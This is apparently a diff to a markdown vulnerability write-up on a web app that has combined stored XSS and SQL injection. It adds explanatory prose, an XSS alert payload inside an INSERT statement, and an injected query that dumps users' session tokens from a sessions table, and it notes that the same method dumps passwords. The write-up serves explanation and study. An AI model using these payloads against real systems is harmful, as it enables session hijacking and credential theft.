@@ -329,8 +329,24 @@ And we're able to grab all the user sessions!
 <li>1:e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65<br>1:2015e754b07fb37c28ee636725d04b8743f91333ac927fe9c0eeca512246fc9c<br>159:8e25b871df997f1f1b219b96a30bda9505a60168aeae51e7d2a011c12bdba184</li>
 ```
 
-<li>1</li>
-<li>1:e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65<br>1:2015e754b07fb37c28ee636725d04b8743f91333ac927fe9c0eeca512246fc9c<br>159:8e25b871df997f1f1b219b96a30bda9505a60168aeae51e7d2a011c12bdba184</li>
+Let's call this Vulnerability as **Stored XSS and SQL Injection Vulnerability by Execution of Arbitrary SQL Queries and JavaScript (aCVE-2024-2)**.
+
+To explain how this works, the original SQL query takes a valid input message and passes it to the sqlite3 handler.
+
+```sql
+INSERT INTO posts (message, user) VALUES ('<script>alert(document.domain)</script>', 1);
+```
+
+However, since we have replaced the `message` with SQL injection, the query would now look like this
+
+```sql
+INSERT INTO posts (message, user) VALUES ('1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1); -- ', 1);
+```
+
+This will first insert the message `1` into **user 1** and then insert the SQL query of concatenating the results of users and tokens resulting to dumping the users and tokens.
+
+Similarly, this works for dumping the username and password.
+
 
 ---
 
